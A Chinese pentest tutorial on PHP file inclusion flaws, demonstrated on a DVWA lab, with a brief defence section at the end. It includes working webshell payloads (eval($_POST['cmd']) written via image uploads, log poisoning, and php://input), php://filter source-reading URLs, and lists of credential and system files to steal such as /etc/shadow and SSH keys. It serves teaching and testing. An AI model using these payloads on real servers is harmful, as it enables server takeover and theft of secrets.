---
draft: false
date: 2016-07-26 09:24:22
title: 文件包含漏洞
description: 
categories:
  - Pentest
tags:
  - 文件包含
---

环境：phpStudy 2016、DVWA v1.10

### 0x00 文件包含
程序开发人员一般会把重复使用的函数写到单个文件中，需要使用某个函数时直接调用此文件，而无需再次编写，这中文件调用的过程一般被称为文件包含。

程序开发人员一般希望代码更灵活，所以将被包含的文件设置为变量，用来进行动态调用，但正是由于这种灵活性，从而导致客户端可以调用一个恶意文件，造成文件包含漏洞。

几乎所有脚本语言都会提供文件包含的功能，但文件包含漏洞在PHP Web Application中居多,而在JSP、ASP、ASP.NET程序中却非常少，甚至没有，这是有些语言设计的弊端。

在PHP中经常出现包含漏洞，但这并不意味这其他语言不存在。

### 0x01 常见文件包含函数
```
include()：执行到include时才包含文件，找不到被包含文件时只会产生警告，脚本将继续执行
require()：只要程序一运行就包含文件，找不到被包含的文件时会产生致命错误，并停止脚本
include_once()和require_once()：若文件中代码已被包含则不会再次包含
```

### 0x02 利用条件
* 程序用include()等文件包含函数通过动态变量的范式引入需要包含的文件
* 用户能够控制该动态变量

``` 
注：PHP中只要文件内容符合PHP语法规范，包含时不管扩展名是什么都会被PHP解析，  
   若文件内容不符合PHP语法规范则会暴漏其源码。包含不存在的文件则可能暴露路径
```

### 0x03 漏洞危害
* 执行任意代码
* 读取文件源码或敏感信息
* 包含恶意文件控制网站
* 甚至控制服务器

### 0x04 漏洞分类
* 本地文件包含：可以包含本地文件，在条件允许时甚至能执行代码
    * 读敏感文件，读PHP文件
    * 包含日志文件GetShell
    * 上传图片马，然后包含从而GetShell
    * 包含/proc/self/envion文件GetShell
    * 包含data:或php://input等伪协议
    * 若有phpinfo则可以包含临时文件
* 远程文件包含：可以直接执行任意代码
    * 要保证php.ini中allow_url_fopen和allow_url_include要为On

### 0x05 漏洞挖掘
> 上AWVS或者自己写代码测试

### 0x06 本地包含GetShell

* 简单代码示例

```php
<?php
    if (@$_GET['page']) {
        include("./action/".$_GET['page']);
    } else {
        include "./action/show.php";
    }
?>
```
![文件包含-上传图片马](/img/post/file_include_upload2.png)
![文件包含-验证能包含图片马](/img/post/file_include_upload2_check.png)

* 包含图片马写shell
    * 生成包含```<?php fputs(fopen("shell.php","w"),"<?php eval(\$_POST['cmd']);?>")?>```的图片马
    * 上传后图片路径为../../hackable/uploads/aa.png
    * 访问```http://10.11.11.20/dvwa/vulnerabilities/fi/?page=../../hackable/uploads/aa.png```
    * 在fi这个文件夹下会看到生成shell.php,内容为```<?php eval($_POST['cmd']);?>```

* 包含日志GetShell(主要是得到日志的路径)

```ini
在Linux下一般读日志路径：
文件包含漏洞读取apache配置文件
index.php?page=/etc/init.d/httpd
index.php?page=/etc/httpd/conf/httpd.conf
默认位置/var/log/httpd/access_log
```
日志会记录客户端请求及服务器响应的信息，访问```http://www.xx.com/<?php phpinfo(); ?>```时，<?php phpinfo(); ?>也会被记录在日志里，也可以插入到User-Agent
![文件包含-包含日志](/img/post/file_include_access.log1.png)
可以通过Burp Suite来绕过编码
![文件包含-包含日志](/img/post/file_include_access.log2.png)
日志内容如下：
![文件包含-包含日志](/img/post/file_include_access.log3.png)
![文件包含-包含日志](/img/post/file_include_access.log4.png)

* 使用PHP封装协议GetShell

```
allow_url_include=On时：

http://www.xxx.com/index.php?page=php://input
POST:<?php fputs(fopen("shell.php","w"),"<?php eval(\$_POST['cmd']);?>") ?>

结果将在index.php所在文件下生成一句话文件shell.php
```

* %00截断包含(PHP<5.3.4 and magic_quotes_gpc=Off，CVE-2006-7243)

![文件包含-上传图片马](/img/post/file_include_upload3.png)

还有一个路径长度截断，可以用.或/.或./截断，Windows需要259个bytes，Linux需要4096个bytes

* phpinfo包含临时文件GetShell

```
向phpinfo上传文件则可以返回文件路径，但是文件存在时间很短，
可以用程序持续上传，然后就可以包含你上传的文件了
```

* 包含环境变量文件GetShell

```
需要PHP运行在CGI模式
然后和包含日志一样，在User-Agent修改为payload
```

### 0x07 本地包含读文件
* 读敏感文件

![文件包含-读敏感文件](/img/post/file_include_read_file.png)

可读如下敏感文件：
```
Windows：
    C:\boot.ini  //查看系统版本
    C:\Windows\System32\inetsrv\MetaBase.xml  //IIS配置文件
    C:\Windows\repair\sam  //存储系统初次安装的密码
    C:\Program Files\mysql\my.ini  //Mysql配置
    C:\Program Files\mysql\data\mysql\user.MYD  //Mysql root
    C:\Windows\php.ini  //php配置信息
    C:\Windows\my.ini  //Mysql配置信息
    ...
Linux：
    /root/.ssh/authorized_keys
    /root/.ssh/id_rsa
    /root/.ssh/id_ras.keystore
    /root/.ssh/known_hosts
    /etc/passwd
    /etc/shadow
    /etc/my.cnf
    /etc/httpd/conf/httpd.conf
    /root/.bash_history
    /root/.mysql_history
    /proc/self/fd/fd[0-9]*(文件标识符)
    /proc/mounts
    /porc/config.gz
```

* 读PHP文件源码

```
直接包含php文件时会被解析，不能看到源码，可以用封装协议读取：
?page=php://filter/read=convert.base64-encode/resource=config.php
访问上述URL后会返回config.php中经过Base64加密后的字符串，解密即可得到源码
```

### 0x08 远程包含
注：远程的文件名不能为php可解析的扩展名，allow_url_fopen和allow_url_include为On是必须的
![文件包含-远程包含](/img/post/file_include_remote_include.png)
若在a.txt写入```<?php fputs(fopen("shell.php","w"),"<?php @eval($_POST['cmd']); ?>") ?>```，可直接写shell

### 0x09 漏洞防御
```
PHP中使用open_basedir配置，将访问限制在指定区域
过滤./\
禁止服务器远程文件包含
```
